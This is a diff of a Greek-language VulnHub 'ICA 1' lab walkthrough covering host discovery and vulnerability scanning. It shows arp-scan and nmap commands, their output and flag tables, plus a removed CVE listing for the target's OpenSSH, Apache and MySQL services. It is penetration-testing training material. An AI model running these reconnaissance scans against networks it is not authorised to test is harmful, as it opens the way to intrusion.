@@ -48,38 +48,68 @@ title: Υλοποίηση Επίθεσης σε Υπολογιστικό Σύσ�
 ---
 <div style="page-break-after: always;"></div>
 
----
-
+%% 
 # Inspired  
 
 [ICA 1 Write up](Hacking/VulnHub/ICA%201/ICA%201%20Write%20up.md)
 
 [ica-1-walkthrough-linkedin](Hacking/VulnHub/ICA%201/ica-1-walkthrough-linkedin.md)
+ %%
 
 ----
 # Scenario  
 
-%% [source Vulnhub](https://www.vulnhub.com/entry/ica-1,748/) %%
+%%  [source Vulnhub](https://www.vulnhub.com/entry/ica-1,748/)  %%
+
+## Description
 
 Έστω οτι εχουμε καταφερει να συνδεθουμε στο εσωτερικο δικτυο μιας εταιριας και θελουμε να αποκτησουμε προσβαση σε εναν υπολογιστη της για να αποκτησουμε πληροφοριες για το προτζεκτ ICA. 
 
+## Ζητούμενα 
+- Χαρτογραφηση του δικτυου και ευρεση ευαλωττου μηχανηματος 
+- Αναγνωριση των ανοιχτων πορτων και των ευπαθειων που μπορουν να εκμετελλευτουν 
+- Αποκτηση προσβασης ως απλος χρηστης στον υπολογιστη 
+- Αποκτηση super user προσβαση στον υπολογιστη 
 
+## Behind the scenes 
+
+
+````col
+```col-md
+### Victim Machine 
+
+Ο ευάλωττος υπολογιστης ειναι ενα virtual machine που τρεχει σε εναν εξωτερικο υπολογιστη με bridged λειτουργια δικτυου ωστε να παιρνει δικια του ip διευθυνση. 
+
+```
+
+```col-md
+### Attacker Machine 
+
+- Debian Linux 
+- Parrot OS Distribution 
+- Tools
+	- nmap
+	- mysql
+	- hydra
+	- exploitdb (searchsploit)
+
+```
+
+
+````
+
+ 
 ---
-
-%%
-[nmap website info](https://www.stationx.net/how-to-scan-vulnerabilities-with-nmap/)
-%%
+<div style="page-break-after: always;"></div>
 
 ----
 
-# Attack 
+# Enumeration 
 
-
-## Enumeration 
-
-### Host discovery
+## Host discovery
 
 Πρωτα απο ολα πρεπει να βρουμε σε ποια ip διευθυνση ειναι ο υπολογιστης που θελουμε να κανουμε επιθεση 
+Υπαρχουν διαφορα εργαλεία που μας επιτρεπουν χαρτογραφηση δικτυου 
 
 #### arp-scan 
 
@@ -94,12 +124,10 @@ Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
 192.168.1.1	34:24:3e:06:a1:04	zte corporation
 192.168.1.6	00:45:e2:9f:96:83	CyberTAN Technology Inc.
 192.168.1.9	00:45:e2:9f:96:83	CyberTAN Technology Inc.
-192.168.1.7	46:3d:cc:39:90:76	(Unknown: locally administered)
+192.168.1.8	46:3d:cc:39:90:76	(Unknown: locally administered)
 
 4 packets received by filter, 0 packets dropped by kernel
 Ending arp-scan 1.10.0: 256 hosts scanned in 2.051 seconds (124.82 hosts/sec). 4 responded
-
-
 ```
 
 
@@ -109,7 +137,7 @@ Ending arp-scan 1.10.0: 256 hosts scanned in 2.051 seconds (124.82 hosts/sec). 4
 sudo nmap -sn 192.168.1.1-254 -oN nmap/recon
 ```
 
-Output:
+*Output:*
 ```
 Starting Nmap 7.94 ( https://nmap.org ) at 2024-01-02 19:16 EET
 Nmap scan report for H1600V7.home (192.168.1.1)
@@ -123,10 +151,12 @@ Host is up (0.000069s latency).
 Nmap done: 254 IP addresses (4 hosts up) scanned in 15.00 seconds
 ```
 
-- `-sn`:
-	- Ειναι ping scan, disables port scanning 
 
-
+| flag              | explanation                                               |     | 
+| ----------------- | --------------------------------------------------------- | --- |
+| `-sn`             | Ειναι ping scan, disables port scanning                   |     |
+| `-oN`             | Αποθηκευει το output της εντολης σε human readable αρχειο |     |
+| `192.168.1.1-254` | Σκαναρει όλο το εσωτερικο δίκτυο                          |     |
 
 
 Βλεπουμε οτι η δικια μας ip ειναι : 
@@ -140,7 +170,7 @@ ip a show wlp4s0
 ```
 
 
-Ξερουμε οτι στην 1.1 ειναι το router, οποτε εχουμε δυο πιθανους υπολογιστες που μπορουμε να κανουμε επιθεση : 1.7 και 1.9 
+Ξερουμε οτι στην `192.168.1.1` ειναι το router, οποτε εχουμε δυο πιθανους υπολογιστες που μπορουμε να κανουμε επιθεση : `192.168.1.7` και `192.168.1.9` 
 
 ```bash
 nmap -Pn -sC -sV -T4 192.168.1.7 -oN nmap/machine_7
@@ -158,7 +188,14 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 108.30 seconds
 ```
 
+Επεξηγηση: 
 
+| flag  | explanation                                                                                       |
+| ----- | ------------------------------------------------------------------------------------------------- |
+| `-Pn` | Παρακαμπτει την διαδικασια ευρεσης ενεργων host, και συμπεριφερεται σε ολους σαν να ειναι ενεργοι |
+| `-sC` | Τρεχει τα default script για σκαναρισμα των πορτων                                                |
+| `-sV` | Παραθετει πληροφοριες για τις υπηρεσιες που τρεχουν πισω απο τις ανοιχτες πορτες                  |
+| `-T4`      | Θετει timeout στα πακετα που στελνει το nmap για πιο γρηγορο σκαν                                                                                                   |
 
 
 ```bash
@@ -201,22 +238,31 @@ Nmap done: 1 IP address (1 host up) scanned in 9.84 seconds
 ```
 
 
+Εαν δεν αποδώσουν οι ανοιχτές πορτες που βρηκαμε με την παραπανω εντολη μπορουμε να τρεξουμε την ιδια εντολη με την παραμετρο `-p-`
 Extensive Scan of the ports: 
 ```bash
 nmap -Pn -sC -sV -T4 192.168.1.9 -oN nmap/machine_9_2 -p- 
 ```
 
+| flag  | explanation |
+| ----- | ----------- |
+| `-p-` | Σκαν των πορτων απο την αρχη εως το τελος (ολων των πορτων)             |
+
+Βλεπουμε οτι στην `192.168.1.9` τρεχει υπηρεσιες που μπορει να ειναι ευαλωττες, αντιθετα με το `192.168.1.7` οποτε θα ασχοληθουμε με αυτην 
+
+```bash 
+export ipt=192.168.1.9
+```
 
 
-Βλεπουμε οτι ο 1.9 τρεχει υπηρεσιες που μπορει να ειναι ευαλωττες, αντιθετα με το 1.7 . 
-
-
+---
+<div style="page-break-after: always;"></div>
 
 ----
 
-### Vulnerability Discovery 
+# Vulnerability Discovery 
 
-#### nmap script vuln
+## nmap script vuln
 
 ```bash
 nmap --script vuln 192.168.1.9 -oN nmap/machine_9_vuln
@@ -265,293 +311,18 @@ Nmap done: 1 IP address (1 host up) scanned in 33.79 seconds
 
 
 
-#### nmap script vulners
+## nmap script vulners
 
+Έναλλακτικη εντολη για αναγνωριση ευπαθειων απο nmap : 
 
 ```bash
 nmap -Pn -sV --script vulners 192.168.1.9 -oN nmap/machine_9_vuln_2
 ```
 
-```bash
-Starting Nmap 7.94 ( https://nmap.org ) at 2024-01-02 19:39 EET
-Nmap scan report for 192.168.1.9 (192.168.1.9)
-Host is up (0.0075s latency).
-Not shown: 997 closed tcp ports (conn-refused)
-PORT     STATE SERVICE VERSION
-22/tcp   open  ssh     OpenSSH 8.4p1 Debian 5 (protocol 2.0)
-| vulners: 
-|   cpe:/a:openbsd:openssh:8.4p1: 
-|     	PRION:CVE-2016-20012	5.0	https://vulners.com/prion/PRION:CVE-2016-20012
-|     	PRION:CVE-2021-28041	4.6	https://vulners.com/prion/PRION:CVE-2021-28041
-|     	CVE-2021-28041	4.6	https://vulners.com/cve/CVE-2021-28041
-|     	CVE-2021-41617	4.4	https://vulners.com/cve/CVE-2021-41617
-|     	PRION:CVE-2020-14145	4.3	https://vulners.com/prion/PRION:CVE-2020-14145
-|     	CVE-2020-14145	4.3	https://vulners.com/cve/CVE-2020-14145
-|     	CVE-2016-20012	4.3	https://vulners.com/cve/CVE-2016-20012
-|     	PRION:CVE-2021-41617	3.5	https://vulners.com/prion/PRION:CVE-2021-41617
-|     	PRION:CVE-2021-36368	2.6	https://vulners.com/prion/PRION:CVE-2021-36368
-|_    	CVE-2021-36368	2.6	https://vulners.com/cve/CVE-2021-36368
-80/tcp   open  http    Apache httpd 2.4.48 ((Debian))
-|_http-server-header: Apache/2.4.48 (Debian)
-| vulners: 
-|   cpe:/a:apache:http_server:2.4.48: 
-|     	PACKETSTORM:171631	7.5	https://vulners.com/packetstorm/PACKETSTORM:171631	*EXPLOIT*
-|     	EDB-ID:51193	7.5	https://vulners.com/exploitdb/EDB-ID:51193	*EXPLOIT*
-|     	CVE-2022-31813	7.5	https://vulners.com/cve/CVE-2022-31813
-|     	CVE-2022-23943	7.5	https://vulners.com/cve/CVE-2022-23943
-|     	CVE-2022-22720	7.5	https://vulners.com/cve/CVE-2022-22720
-|     	CVE-2021-44790	7.5	https://vulners.com/cve/CVE-2021-44790
-|     	CVE-2021-39275	7.5	https://vulners.com/cve/CVE-2021-39275
-|     	CNVD-2022-73123	7.5	https://vulners.com/cnvd/CNVD-2022-73123
-|     	CNVD-2022-03225	7.5	https://vulners.com/cnvd/CNVD-2022-03225
-|     	CNVD-2021-102386	7.5	https://vulners.com/cnvd/CNVD-2021-102386
-|     	1337DAY-ID-38427	7.5	https://vulners.com/zdt/1337DAY-ID-38427	*EXPLOIT*
-|     	FDF3DFA1-ED74-5EE2-BF5C-BA752CA34AE8	6.8	https://vulners.com/githubexploit/FDF3DFA1-ED74-5EE2-BF5C-BA752CA34AE8	*EXPLOIT*
-|     	CVE-2021-40438	6.8	https://vulners.com/cve/CVE-2021-40438
-|     	CNVD-2022-03224	6.8	https://vulners.com/cnvd/CNVD-2022-03224
-|     	AE3EF1CC-A0C3-5CB7-A6EF-4DAAAFA59C8C	6.8	https://vulners.com/githubexploit/AE3EF1CC-A0C3-5CB7-A6EF-4DAAAFA59C8C	*EXPLOIT*
-|     	8AFB43C5-ABD4-52AD-BB19-24D7884FF2A2	6.8	https://vulners.com/githubexploit/8AFB43C5-ABD4-52AD-BB19-24D7884FF2A2	*EXPLOIT*
-|     	4810E2D9-AC5F-5B08-BFB3-DDAFA2F63332	6.8	https://vulners.com/githubexploit/4810E2D9-AC5F-5B08-BFB3-DDAFA2F63332	*EXPLOIT*
-|     	4373C92A-2755-5538-9C91-0469C995AA9B	6.8	https://vulners.com/githubexploit/4373C92A-2755-5538-9C91-0469C995AA9B	*EXPLOIT*
-|     	36618CA8-9316-59CA-B748-82F15F407C4F	6.8	https://vulners.com/githubexploit/36618CA8-9316-59CA-B748-82F15F407C4F	*EXPLOIT*
-|     	0095E929-7573-5E4A-A7FA-F6598A35E8DE	6.8	https://vulners.com/githubexploit/0095E929-7573-5E4A-A7FA-F6598A35E8DE	*EXPLOIT*
-|     	OSV:BIT-2023-31122	6.4	https://vulners.com/osv/OSV:BIT-2023-31122
-|     	CVE-2022-28615	6.4	https://vulners.com/cve/CVE-2022-28615
-|     	CVE-2021-44224	6.4	https://vulners.com/cve/CVE-2021-44224
-|     	CVE-2022-22721	5.8	https://vulners.com/cve/CVE-2022-22721
-|     	CVE-2022-36760	5.1	https://vulners.com/cve/CVE-2022-36760
-|     	OSV:BIT-2023-45802	5.0	https://vulners.com/osv/OSV:BIT-2023-45802
-|     	OSV:BIT-2023-43622	5.0	https://vulners.com/osv/OSV:BIT-2023-43622
-|     	F7F6E599-CEF4-5E03-8E10-FE18C4101E38	5.0	https://vulners.com/githubexploit/F7F6E599-CEF4-5E03-8E10-FE18C4101E38	*EXPLOIT*
-|     	E5C174E5-D6E8-56E0-8403-D287DE52EB3F	5.0	https://vulners.com/githubexploit/E5C174E5-D6E8-56E0-8403-D287DE52EB3F	*EXPLOIT*
-|     	DB6E1BBD-08B1-574D-A351-7D6BB9898A4A	5.0	https://vulners.com/githubexploit/DB6E1BBD-08B1-574D-A351-7D6BB9898A4A	*EXPLOIT*
-|     	CVE-2022-37436	5.0	https://vulners.com/cve/CVE-2022-37436
-|     	CVE-2022-30556	5.0	https://vulners.com/cve/CVE-2022-30556
-|     	CVE-2022-29404	5.0	https://vulners.com/cve/CVE-2022-29404
-|     	CVE-2022-28614	5.0	https://vulners.com/cve/CVE-2022-28614
-|     	CVE-2022-26377	5.0	https://vulners.com/cve/CVE-2022-26377
-|     	CVE-2022-22719	5.0	https://vulners.com/cve/CVE-2022-22719
-|     	CVE-2021-36160	5.0	https://vulners.com/cve/CVE-2021-36160
-|     	CVE-2021-34798	5.0	https://vulners.com/cve/CVE-2021-34798
-|     	CVE-2021-33193	5.0	https://vulners.com/cve/CVE-2021-33193
-|     	CVE-2006-20001	5.0	https://vulners.com/cve/CVE-2006-20001
-|     	CNVD-2023-93320	5.0	https://vulners.com/cnvd/CNVD-2023-93320
-|     	CNVD-2023-80558	5.0	https://vulners.com/cnvd/CNVD-2023-80558
-|     	CNVD-2022-73122	5.0	https://vulners.com/cnvd/CNVD-2022-73122
-|     	CNVD-2022-53584	5.0	https://vulners.com/cnvd/CNVD-2022-53584
-|     	CNVD-2022-53582	5.0	https://vulners.com/cnvd/CNVD-2022-53582
-|     	CNVD-2022-03223	5.0	https://vulners.com/cnvd/CNVD-2022-03223
-|     	C9A1C0C1-B6E3-5955-A4F1-DEA0E505B14B	5.0	https://vulners.com/githubexploit/C9A1C0C1-B6E3-5955-A4F1-DEA0E505B14B	*EXPLOIT*
-|     	BD3652A9-D066-57BA-9943-4E34970463B9	5.0	https://vulners.com/githubexploit/BD3652A9-D066-57BA-9943-4E34970463B9	*EXPLOIT*
-|     	B0208442-6E17-5772-B12D-B5BE30FA5540	5.0	https://vulners.com/githubexploit/B0208442-6E17-5772-B12D-B5BE30FA5540	*EXPLOIT*
-|     	A820A056-9F91-5059-B0BC-8D92C7A31A52	5.0	https://vulners.com/githubexploit/A820A056-9F91-5059-B0BC-8D92C7A31A52	*EXPLOIT*
-|     	9814661A-35A4-5DB7-BB25-A1040F365C81	5.0	https://vulners.com/githubexploit/9814661A-35A4-5DB7-BB25-A1040F365C81	*EXPLOIT*
-|     	5A864BCC-B490-5532-83AB-2E4109BB3C31	5.0	https://vulners.com/githubexploit/5A864BCC-B490-5532-83AB-2E4109BB3C31	*EXPLOIT*
-|_    	17C6AD2A-8469-56C8-BBBE-1764D0DF1680	5.0	https://vulners.com/githubexploit/17C6AD2A-8469-56C8-BBBE-1764D0DF1680	*EXPLOIT*
-3306/tcp open  mysql   MySQL 8.0.26
-| vulners: 
-|   cpe:/a:mysql:mysql:8.0.26: 
-|     	PRION:CVE-2021-35638	6.8	https://vulners.com/prion/PRION:CVE-2021-35638
-|     	PRION:CVE-2021-35637	6.8	https://vulners.com/prion/PRION:CVE-2021-35637
-|     	PRION:CVE-2022-21368	6.5	https://vulners.com/prion/PRION:CVE-2022-21368
-|     	PRION:CVE-2022-21600	5.8	https://vulners.com/prion/PRION:CVE-2022-21600
-|     	PRION:CVE-2022-21479	5.5	https://vulners.com/prion/PRION:CVE-2022-21479
-|     	PRION:CVE-2022-21478	5.5	https://vulners.com/prion/PRION:CVE-2022-21478
-|     	PRION:CVE-2022-21425	5.5	https://vulners.com/prion/PRION:CVE-2022-21425
-|     	PRION:CVE-2022-21378	5.5	https://vulners.com/prion/PRION:CVE-2022-21378
-|     	PRION:CVE-2022-21367	5.5	https://vulners.com/prion/PRION:CVE-2022-21367
-|     	PRION:CVE-2022-21351	5.5	https://vulners.com/prion/PRION:CVE-2022-21351
-|     	PRION:CVE-2022-21278	5.5	https://vulners.com/prion/PRION:CVE-2022-21278
-|     	PRION:CVE-2021-35612	5.5	https://vulners.com/prion/PRION:CVE-2021-35612
-|     	PRION:CVE-2021-35610	5.5	https://vulners.com/prion/PRION:CVE-2021-35610
-|     	PRION:CVE-2022-21352	4.9	https://vulners.com/prion/PRION:CVE-2022-21352
-|     	PRION:CVE-2023-21880	4.7	https://vulners.com/prion/PRION:CVE-2023-21880
-|     	PRION:CVE-2023-21877	4.7	https://vulners.com/prion/PRION:CVE-2023-21877
-|     	PRION:CVE-2022-21635	4.7	https://vulners.com/prion/PRION:CVE-2022-21635
-|     	PRION:CVE-2022-21301	4.7	https://vulners.com/prion/PRION:CVE-2022-21301
-|     	PRION:CVE-2022-21265	4.7	https://vulners.com/prion/PRION:CVE-2022-21265
-|     	PRION:CVE-2023-21980	4.6	https://vulners.com/prion/PRION:CVE-2023-21980
-|     	PRION:CVE-2022-21318	4.6	https://vulners.com/prion/PRION:CVE-2022-21318
-|     	PRION:CVE-2022-21316	4.6	https://vulners.com/prion/PRION:CVE-2022-21316
-|     	PRION:CVE-2023-22079	4.0	https://vulners.com/prion/PRION:CVE-2023-22079
-|     	PRION:CVE-2023-22059	4.0	https://vulners.com/prion/PRION:CVE-2023-22059
-|     	PRION:CVE-2022-39410	4.0	https://vulners.com/prion/PRION:CVE-2022-39410
-|     	PRION:CVE-2022-39408	4.0	https://vulners.com/prion/PRION:CVE-2022-39408
-|     	PRION:CVE-2022-21592	4.0	https://vulners.com/prion/PRION:CVE-2022-21592
-|     	PRION:CVE-2022-21489	4.0	https://vulners.com/prion/PRION:CVE-2022-21489
-|     	PRION:CVE-2022-21483	4.0	https://vulners.com/prion/PRION:CVE-2022-21483
-|     	PRION:CVE-2022-21482	4.0	https://vulners.com/prion/PRION:CVE-2022-21482
-|     	PRION:CVE-2022-21454	4.0	https://vulners.com/prion/PRION:CVE-2022-21454
-|     	PRION:CVE-2022-21427	4.0	https://vulners.com/prion/PRION:CVE-2022-21427
-|     	PRION:CVE-2022-21417	4.0	https://vulners.com/prion/PRION:CVE-2022-21417
-|     	PRION:CVE-2022-21412	4.0	https://vulners.com/prion/PRION:CVE-2022-21412
-|     	PRION:CVE-2022-21374	4.0	https://vulners.com/prion/PRION:CVE-2022-21374
-|     	PRION:CVE-2022-21372	4.0	https://vulners.com/prion/PRION:CVE-2022-21372
-|     	PRION:CVE-2022-21370	4.0	https://vulners.com/prion/PRION:CVE-2022-21370
-|     	PRION:CVE-2022-21362	4.0	https://vulners.com/prion/PRION:CVE-2022-21362
-|     	PRION:CVE-2022-21358	4.0	https://vulners.com/prion/PRION:CVE-2022-21358
-|     	PRION:CVE-2022-21356	4.0	https://vulners.com/prion/PRION:CVE-2022-21356
-|     	PRION:CVE-2022-21348	4.0	https://vulners.com/prion/PRION:CVE-2022-21348
-|     	PRION:CVE-2022-21344	4.0	https://vulners.com/prion/PRION:CVE-2022-21344
-|     	PRION:CVE-2022-21342	4.0	https://vulners.com/prion/PRION:CVE-2022-21342
-|     	PRION:CVE-2022-21337	4.0	https://vulners.com/prion/PRION:CVE-2022-21337
-|     	PRION:CVE-2022-21336	4.0	https://vulners.com/prion/PRION:CVE-2022-21336
-|     	PRION:CVE-2022-21335	4.0	https://vulners.com/prion/PRION:CVE-2022-21335
-|     	PRION:CVE-2022-21334	4.0	https://vulners.com/prion/PRION:CVE-2022-21334
-|     	PRION:CVE-2022-21332	4.0	https://vulners.com/prion/PRION:CVE-2022-21332
-|     	PRION:CVE-2022-21330	4.0	https://vulners.com/prion/PRION:CVE-2022-21330
-|     	PRION:CVE-2022-21329	4.0	https://vulners.com/prion/PRION:CVE-2022-21329
-|     	PRION:CVE-2022-21328	4.0	https://vulners.com/prion/PRION:CVE-2022-21328
-|     	PRION:CVE-2022-21327	4.0	https://vulners.com/prion/PRION:CVE-2022-21327
-|     	PRION:CVE-2022-21326	4.0	https://vulners.com/prion/PRION:CVE-2022-21326
-|     	PRION:CVE-2022-21322	4.0	https://vulners.com/prion/PRION:CVE-2022-21322
-|     	PRION:CVE-2022-21320	4.0	https://vulners.com/prion/PRION:CVE-2022-21320
-|     	PRION:CVE-2022-21315	4.0	https://vulners.com/prion/PRION:CVE-2022-21315
-|     	PRION:CVE-2022-21314	4.0	https://vulners.com/prion/PRION:CVE-2022-21314
-|     	PRION:CVE-2022-21310	4.0	https://vulners.com/prion/PRION:CVE-2022-21310
-|     	PRION:CVE-2022-21309	4.0	https://vulners.com/prion/PRION:CVE-2022-21309
-|     	PRION:CVE-2022-21308	4.0	https://vulners.com/prion/PRION:CVE-2022-21308
-|     	PRION:CVE-2022-21307	4.0	https://vulners.com/prion/PRION:CVE-2022-21307
-|     	PRION:CVE-2022-21297	4.0	https://vulners.com/prion/PRION:CVE-2022-21297
-|     	PRION:CVE-2022-21290	4.0	https://vulners.com/prion/PRION:CVE-2022-21290
-|     	PRION:CVE-2022-21289	4.0	https://vulners.com/prion/PRION:CVE-2022-21289
-|     	PRION:CVE-2022-21288	4.0	https://vulners.com/prion/PRION:CVE-2022-21288
-|     	PRION:CVE-2022-21287	4.0	https://vulners.com/prion/PRION:CVE-2022-21287
-|     	PRION:CVE-2022-21286	4.0	https://vulners.com/prion/PRION:CVE-2022-21286
-|     	PRION:CVE-2022-21285	4.0	https://vulners.com/prion/PRION:CVE-2022-21285
-|     	PRION:CVE-2022-21284	4.0	https://vulners.com/prion/PRION:CVE-2022-21284
-|     	PRION:CVE-2022-21280	4.0	https://vulners.com/prion/PRION:CVE-2022-21280
-|     	PRION:CVE-2022-21279	4.0	https://vulners.com/prion/PRION:CVE-2022-21279
-|     	PRION:CVE-2022-21245	4.0	https://vulners.com/prion/PRION:CVE-2022-21245
-|     	PRION:CVE-2021-35648	4.0	https://vulners.com/prion/PRION:CVE-2021-35648
-|     	PRION:CVE-2021-35647	4.0	https://vulners.com/prion/PRION:CVE-2021-35647
-|     	PRION:CVE-2021-35646	4.0	https://vulners.com/prion/PRION:CVE-2021-35646
-|     	PRION:CVE-2021-35645	4.0	https://vulners.com/prion/PRION:CVE-2021-35645
-|     	PRION:CVE-2021-35644	4.0	https://vulners.com/prion/PRION:CVE-2021-35644
-|     	PRION:CVE-2021-35643	4.0	https://vulners.com/prion/PRION:CVE-2021-35643
-|     	PRION:CVE-2021-35642	4.0	https://vulners.com/prion/PRION:CVE-2021-35642
-|     	PRION:CVE-2021-35641	4.0	https://vulners.com/prion/PRION:CVE-2021-35641
-|     	PRION:CVE-2021-35640	4.0	https://vulners.com/prion/PRION:CVE-2021-35640
-|     	PRION:CVE-2021-35636	4.0	https://vulners.com/prion/PRION:CVE-2021-35636
-|     	PRION:CVE-2021-35635	4.0	https://vulners.com/prion/PRION:CVE-2021-35635
-|     	PRION:CVE-2021-35634	4.0	https://vulners.com/prion/PRION:CVE-2021-35634
-|     	PRION:CVE-2021-35633	4.0	https://vulners.com/prion/PRION:CVE-2021-35633
-|     	PRION:CVE-2021-35631	4.0	https://vulners.com/prion/PRION:CVE-2021-35631
-|     	PRION:CVE-2021-35630	4.0	https://vulners.com/prion/PRION:CVE-2021-35630
-|     	PRION:CVE-2021-35628	4.0	https://vulners.com/prion/PRION:CVE-2021-35628
-|     	PRION:CVE-2021-35627	4.0	https://vulners.com/prion/PRION:CVE-2021-35627
-|     	PRION:CVE-2021-35626	4.0	https://vulners.com/prion/PRION:CVE-2021-35626
-|     	PRION:CVE-2021-35625	4.0	https://vulners.com/prion/PRION:CVE-2021-35625
-|     	PRION:CVE-2021-35624	4.0	https://vulners.com/prion/PRION:CVE-2021-35624
-|     	PRION:CVE-2021-35623	4.0	https://vulners.com/prion/PRION:CVE-2021-35623
-|     	PRION:CVE-2021-35622	4.0	https://vulners.com/prion/PRION:CVE-2021-35622
-|     	PRION:CVE-2021-35607	4.0	https://vulners.com/prion/PRION:CVE-2021-35607
-|     	PRION:CVE-2021-35597	4.0	https://vulners.com/prion/PRION:CVE-2021-35597
-|     	PRION:CVE-2023-22115	3.3	https://vulners.com/prion/PRION:CVE-2023-22115
-|     	PRION:CVE-2023-22114	3.3	https://vulners.com/prion/PRION:CVE-2023-22114
-|     	PRION:CVE-2023-22113	3.3	https://vulners.com/prion/PRION:CVE-2023-22113
-|     	PRION:CVE-2023-22112	3.3	https://vulners.com/prion/PRION:CVE-2023-22112
-|     	PRION:CVE-2023-22111	3.3	https://vulners.com/prion/PRION:CVE-2023-22111
-|     	PRION:CVE-2023-22110	3.3	https://vulners.com/prion/PRION:CVE-2023-22110
-|     	PRION:CVE-2023-22104	3.3	https://vulners.com/prion/PRION:CVE-2023-22104
-|     	PRION:CVE-2023-22103	3.3	https://vulners.com/prion/PRION:CVE-2023-22103
-|     	PRION:CVE-2023-22097	3.3	https://vulners.com/prion/PRION:CVE-2023-22097
-|     	PRION:CVE-2023-22092	3.3	https://vulners.com/prion/PRION:CVE-2023-22092
-|     	PRION:CVE-2023-22084	3.3	https://vulners.com/prion/PRION:CVE-2023-22084
-|     	PRION:CVE-2023-22078	3.3	https://vulners.com/prion/PRION:CVE-2023-22078
-|     	PRION:CVE-2023-22070	3.3	https://vulners.com/prion/PRION:CVE-2023-22070
-|     	PRION:CVE-2023-22068	3.3	https://vulners.com/prion/PRION:CVE-2023-22068
-|     	PRION:CVE-2023-22066	3.3	https://vulners.com/prion/PRION:CVE-2023-22066
-|     	PRION:CVE-2023-22065	3.3	https://vulners.com/prion/PRION:CVE-2023-22065
-|     	PRION:CVE-2023-22064	3.3	https://vulners.com/prion/PRION:CVE-2023-22064
-|     	PRION:CVE-2023-22032	3.3	https://vulners.com/prion/PRION:CVE-2023-22032
-|     	PRION:CVE-2023-22028	3.3	https://vulners.com/prion/PRION:CVE-2023-22028
-|     	PRION:CVE-2023-22026	3.3	https://vulners.com/prion/PRION:CVE-2023-22026
-|     	PRION:CVE-2023-22015	3.3	https://vulners.com/prion/PRION:CVE-2023-22015
-|     	PRION:CVE-2023-22007	3.3	https://vulners.com/prion/PRION:CVE-2023-22007
-|     	PRION:CVE-2023-21982	3.3	https://vulners.com/prion/PRION:CVE-2023-21982
-|     	PRION:CVE-2023-21977	3.3	https://vulners.com/prion/PRION:CVE-2023-21977
-|     	PRION:CVE-2023-21976	3.3	https://vulners.com/prion/PRION:CVE-2023-21976
-|     	PRION:CVE-2023-21972	3.3	https://vulners.com/prion/PRION:CVE-2023-21972
-|     	PRION:CVE-2023-21950	3.3	https://vulners.com/prion/PRION:CVE-2023-21950
-|     	PRION:CVE-2023-21887	3.3	https://vulners.com/prion/PRION:CVE-2023-21887
-|     	PRION:CVE-2023-21883	3.3	https://vulners.com/prion/PRION:CVE-2023-21883
-|     	PRION:CVE-2023-21882	3.3	https://vulners.com/prion/PRION:CVE-2023-21882
-|     	PRION:CVE-2023-21881	3.3	https://vulners.com/prion/PRION:CVE-2023-21881
-|     	PRION:CVE-2023-21879	3.3	https://vulners.com/prion/PRION:CVE-2023-21879
-|     	PRION:CVE-2023-21878	3.3	https://vulners.com/prion/PRION:CVE-2023-21878
-|     	PRION:CVE-2023-21876	3.3	https://vulners.com/prion/PRION:CVE-2023-21876
-|     	PRION:CVE-2022-39400	3.3	https://vulners.com/prion/PRION:CVE-2022-39400
-|     	PRION:CVE-2022-21641	3.3	https://vulners.com/prion/PRION:CVE-2022-21641
-|     	PRION:CVE-2022-21640	3.3	https://vulners.com/prion/PRION:CVE-2022-21640
-|     	PRION:CVE-2022-21638	3.3	https://vulners.com/prion/PRION:CVE-2022-21638
-|     	PRION:CVE-2022-21637	3.3	https://vulners.com/prion/PRION:CVE-2022-21637
-|     	PRION:CVE-2022-21633	3.3	https://vulners.com/prion/PRION:CVE-2022-21633
-|     	PRION:CVE-2022-21632	3.3	https://vulners.com/prion/PRION:CVE-2022-21632
-|     	PRION:CVE-2022-21617	3.3	https://vulners.com/prion/PRION:CVE-2022-21617
-|     	PRION:CVE-2022-21608	3.3	https://vulners.com/prion/PRION:CVE-2022-21608
-|     	PRION:CVE-2022-21607	3.3	https://vulners.com/prion/PRION:CVE-2022-21607
-|     	PRION:CVE-2022-21605	3.3	https://vulners.com/prion/PRION:CVE-2022-21605
-|     	PRION:CVE-2022-21604	3.3	https://vulners.com/prion/PRION:CVE-2022-21604
-|     	PRION:CVE-2022-21599	3.3	https://vulners.com/prion/PRION:CVE-2022-21599
-|     	PRION:CVE-2022-21594	3.3	https://vulners.com/prion/PRION:CVE-2022-21594
-|     	PRION:CVE-2022-21339	3.3	https://vulners.com/prion/PRION:CVE-2022-21339
-|     	PRION:CVE-2022-21304	3.3	https://vulners.com/prion/PRION:CVE-2022-21304
-|     	PRION:CVE-2022-21303	3.3	https://vulners.com/prion/PRION:CVE-2022-21303
-|     	PRION:CVE-2022-21270	3.3	https://vulners.com/prion/PRION:CVE-2022-21270
-|     	PRION:CVE-2022-21264	3.3	https://vulners.com/prion/PRION:CVE-2022-21264
-|     	PRION:CVE-2022-21256	3.3	https://vulners.com/prion/PRION:CVE-2022-21256
-|     	PRION:CVE-2022-21253	3.3	https://vulners.com/prion/PRION:CVE-2022-21253
-|     	PRION:CVE-2022-21249	3.3	https://vulners.com/prion/PRION:CVE-2022-21249
-|     	PRION:CVE-2021-35596	3.3	https://vulners.com/prion/PRION:CVE-2021-35596
-|     	PRION:CVE-2021-35591	3.3	https://vulners.com/prion/PRION:CVE-2021-35591
-|     	PRION:CVE-2021-35577	3.3	https://vulners.com/prion/PRION:CVE-2021-35577
-|     	PRION:CVE-2021-35575	3.3	https://vulners.com/prion/PRION:CVE-2021-35575
-|     	PRION:CVE-2021-35546	3.3	https://vulners.com/prion/PRION:CVE-2021-35546
-|     	PRION:CVE-2021-2479	3.3	https://vulners.com/prion/PRION:CVE-2021-2479
-|     	PRION:CVE-2021-2478	3.3	https://vulners.com/prion/PRION:CVE-2021-2478
-|     	PRION:CVE-2023-21875	3.2	https://vulners.com/prion/PRION:CVE-2023-21875
-|     	PRION:CVE-2021-35602	3.2	https://vulners.com/prion/PRION:CVE-2021-35602
-|     	PRION:CVE-2022-39403	3.0	https://vulners.com/prion/PRION:CVE-2022-39403
-|     	PRION:CVE-2022-21486	2.9	https://vulners.com/prion/PRION:CVE-2022-21486
-|     	PRION:CVE-2022-21485	2.9	https://vulners.com/prion/PRION:CVE-2022-21485
-|     	PRION:CVE-2022-21484	2.9	https://vulners.com/prion/PRION:CVE-2022-21484
-|     	PRION:CVE-2022-21357	2.9	https://vulners.com/prion/PRION:CVE-2022-21357
-|     	PRION:CVE-2022-21355	2.9	https://vulners.com/prion/PRION:CVE-2022-21355
-|     	PRION:CVE-2022-21333	2.9	https://vulners.com/prion/PRION:CVE-2022-21333
